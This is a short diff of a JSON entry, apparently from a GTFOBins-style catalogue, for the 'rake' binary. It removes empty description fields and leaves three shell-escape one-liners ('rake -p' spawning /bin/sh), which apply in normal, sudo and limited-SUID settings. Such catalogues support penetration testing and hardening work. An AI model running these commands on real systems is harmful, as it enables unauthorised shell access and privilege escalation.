@@ -8,19 +8,19 @@
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "rake -p '`/bin/sh 1>&0`'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo rake -p '`/bin/sh 1>&0`'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./rake -p '`/bin/sh 1>&0`'\n"
       }
     ]
